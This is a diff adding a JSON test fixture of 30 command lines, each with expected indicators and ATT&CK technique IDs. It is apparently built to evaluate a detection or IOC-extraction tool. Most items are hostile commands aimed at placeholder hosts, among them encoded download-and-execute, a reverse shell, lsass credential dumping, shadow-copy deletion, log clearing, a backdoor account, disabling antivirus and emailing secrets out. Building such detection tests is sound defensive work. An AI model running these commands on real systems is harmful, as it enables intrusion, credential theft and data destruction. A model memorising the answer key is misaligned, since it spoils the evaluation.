@@ -1,0 +1,405 @@
+{
+ "items": [
+  {
+   "id": "script-01",
+   "text": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA",
+   "expected_indicators": [
+    [
+     "url",
+     "http://evil.example.com/a.ps1"
+    ]
+   ],
+   "expected_techniques": [
+    "T1027",
+    "T1059.001",
+    "T1105",
+    "T1564.003"
+   ]
+  },
+  {
+   "id": "script-02",
+   "text": "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+   "expected_indicators": [
+    [
+     "url",
+     "http://198.51.100.23/p.exe"
+    ],
+    [
+     "ip",
+     "198.51.100.23"
+    ],
+    [
+     "path",
+     "C:\\Users\\Public\\p.exe"
+    ]
+   ],
+   "expected_techniques": [
+    "T1105"
+   ]
+  },
+  {
+   "id": "script-03",
+   "text": "schtasks /create /sc minute /mo 5 /tn Updater /tr \"C:\\ProgramData\\upd.exe\"",
+   "expected_indicators": [
+    [
+     "path",
+     "C:\\ProgramData\\upd.exe"
+    ]
+   ],
+   "expected_techniques": [
+    "T1053.005"
+   ]
+  },
+  {
+   "id": "script-04",
+   "text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /t REG_SZ /d C:\\Users\\bob\\AppData\\Roaming\\upd.exe",
+   "expected_indicators": [
+    [
+     "registry",
+     "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    ],
+    [
+     "path",
+     "C:\\Users\\bob\\AppData\\Roaming\\upd.exe"
+    ]
+   ],
+   "expected_techniques": [
+    "T1547.001"
+   ]
+  },
+  {
+   "id": "script-05",
+   "text": "vssadmin.exe delete shadows /all /quiet",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1490"
+   ]
+  },
+  {
+   "id": "script-06",
+   "text": "wevtutil cl Security",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1070.001"
+   ]
+  },
+  {
+   "id": "script-07",
+   "text": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+   "expected_indicators": [
+    [
+     "ip",
+     "203.0.113.9"
+    ]
+   ],
+   "expected_techniques": [
+    "T1059.004"
+   ]
+  },
+  {
+   "id": "script-08",
+   "text": "curl -s http://malicious.example.net/i.sh | sh",
+   "expected_indicators": [
+    [
+     "url",
+     "http://malicious.example.net/i.sh"
+    ]
+   ],
+   "expected_techniques": [
+    "T1105"
+   ]
+  },
+  {
+   "id": "script-09",
+   "text": "wget http://203.0.113.10/x -O /tmp/x; chmod +x /tmp/x; /tmp/x",
+   "expected_indicators": [
+    [
+     "url",
+     "http://203.0.113.10/x"
+    ],
+    [
+     "ip",
+     "203.0.113.10"
+    ]
+   ],
+   "expected_techniques": [
+    "T1105"
+   ]
+  },
+  {
+   "id": "script-10",
+   "text": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1003.001"
+   ]
+  },
+  {
+   "id": "script-11",
+   "text": "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\l.dmp",
+   "expected_indicators": [
+    [
+     "path",
+     "C:\\Temp\\l.dmp"
+    ]
+   ],
+   "expected_techniques": [
+    "T1003.001"
+   ]
+  },
+  {
+   "id": "script-12",
+   "text": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\out.dmp full",
+   "expected_indicators": [
+    [
+     "path",
+     "C:\\Windows\\System32\\comsvcs.dll"
+    ],
+    [
+     "path",
+     "C:\\Temp\\out.dmp"
+    ]
+   ],
+   "expected_techniques": [
+    "T1218.011",
+    "T1003.001"
+   ]
+  },
+  {
+   "id": "script-13",
+   "text": "mshta http://evil.example.org/p.hta",
+   "expected_indicators": [
+    [
+     "url",
+     "http://evil.example.org/p.hta"
+    ]
+   ],
+   "expected_techniques": [
+    "T1218.005"
+   ]
+  },
+  {
+   "id": "script-14",
+   "text": "regsvr32 /s /n /u /i:http://203.0.113.12/f.sct scrobj.dll",
+   "expected_indicators": [
+    [
+     "url",
+     "http://203.0.113.12/f.sct"
+    ],
+    [
+     "ip",
+     "203.0.113.12"
+    ]
+   ],
+   "expected_techniques": [
+    "T1218.010"
+   ]
+  },
+  {
+   "id": "script-15",
+   "text": "net user backdoor P@ssw0rd1 /add",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "script-16",
+   "text": "Set-MpPreference -DisableRealtimeMonitoring $true",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "script-17",
+   "text": "bitsadmin /transfer job /download /priority high http://evil.example.com/b.exe C:\\Users\\Public\\b.exe",
+   "expected_indicators": [
+    [
+     "url",
+     "http://evil.example.com/b.exe"
+    ],
+    [
+     "path",
+     "C:\\Users\\Public\\b.exe"
+    ]
+   ],
+   "expected_techniques": [
+    "T1197"
+   ]
+  },
+  {
+   "id": "script-18",
+   "text": "wmic /node:10.1.2.3 process call create \"cmd.exe /c whoami\"",
+   "expected_indicators": [
+    [
+     "ip",
+     "10.1.2.3"
+    ]
+   ],
+   "expected_techniques": [
+    "T1047",
+    "T1059.003"
+   ]
+  },
+  {
+   "id": "script-19",
+   "text": "$s=[char]73+[char]69+[char]88; & $s",
+   "expected_indicators": [],
+   "expected_techniques": [
+    "T1059.001"
+   ]
+  },
+  {
+   "id": "script-20",
+   "text": "eval(String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,46,99,111,109))",
+   "expected_indicators": [
+    [
+     "url",
+     "http://evil.example.com"
+    ]
+   ],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-21",
+   "text": "IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIAAAAAAACCvPMK8vPTtUNT00KSi0sTS0uUdANLcpUyCgpKbDS1zcyMNYz0DM0NNYzMdEv1isoNlTQ9S8tccvMSVVQSc0rswpx9Q2IAUsAADvxXJtJAAAA'),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
+   "expected_indicators": [
+    [
+     "url",
+     "http://203.0.113.44/s.ps1"
+    ],
+    [
+     "ip",
+     "203.0.113.44"
+    ]
+   ],
+   "expected_techniques": [
+    "T1140",
+    "T1059.001",
+    "T1105"
+   ]
+  },
+  {
+   "id": "script-22",
+   "text": "callback seen at hxxp://bad[.]example[.]com/x",
+   "expected_indicators": [
+    [
+     "url",
+     "http://bad.example.com/x"
+    ]
+   ],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-23",
+   "text": "Send-MailMessage -To exfil@evil.example.com -Attachments C:\\Users\\bob\\Documents\\secrets.zip -SmtpServer smtp.evil.example.com",
+   "expected_indicators": [
+    [
+     "email",
+     "exfil@evil.example.com"
+    ],
+    [
+     "path",
+     "C:\\Users\\bob\\Documents\\secrets.zip"
+    ],
+    [
+     "domain",
+     "smtp.evil.example.com"
+    ]
+   ],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-24",
+   "text": "certutil -hashfile payload.bin SHA256 -> e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "expected_indicators": [
+    [
+     "hash",
+     "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    ]
+   ],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-25",
+   "text": "powershell.exe -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAyADAAMwAuADAALgAxADEAMwAuADkAOQAnACwANAA0ADMAKQA=",
+   "expected_indicators": [
+    [
+     "ip",
+     "203.0.113.99"
+    ]
+   ],
+   "expected_techniques": [
+    "T1027",
+    "T1059.001"
+   ]
+  },
+  {
+   "id": "script-26",
+   "text": "$h='4945582869777220687474703a2f2f3230332e302e3131332e372f6129'",
+   "expected_indicators": [
+    [
+     "url",
+     "http://203.0.113.7/a"
+    ],
+    [
+     "ip",
+     "203.0.113.7"
+    ]
+   ],
+   "expected_techniques": [
+    "T1059.001",
+    "T1105"
+   ]
+  },
+  {
+   "id": "script-27",
+   "text": "cmd /c start %68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2e%63%6f%6d",
+   "expected_indicators": [
+    [
+     "url",
+     "http://evil.example.com"
+    ]
+   ],
+   "expected_techniques": [
+    "T1059.003"
+   ]
+  },
+  {
+   "id": "script-28",
+   "text": "Get-ChildItem C:\\Windows\\Logs | Measure-Object",
+   "expected_indicators": [
+    [
+     "path",
+     "C:\\Windows\\Logs"
+    ]
+   ],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-29",
+   "text": "systemctl restart nginx",
+   "expected_indicators": [],
+   "expected_techniques": []
+  },
+  {
+   "id": "script-30",
+   "text": "(crontab -l; echo \"*/5 * * * * curl -s http://203.0.113.50/c | bash\") | crontab -",
+   "expected_indicators": [
+    [
+     "url",
+     "http://203.0.113.50/c"
+    ],
+    [
+     "ip",
+     "203.0.113.50"
+    ]
+   ],
+   "expected_techniques": [
+    "T1053.003",
+    "T1105"
+   ]
+  }
+ ]
+}
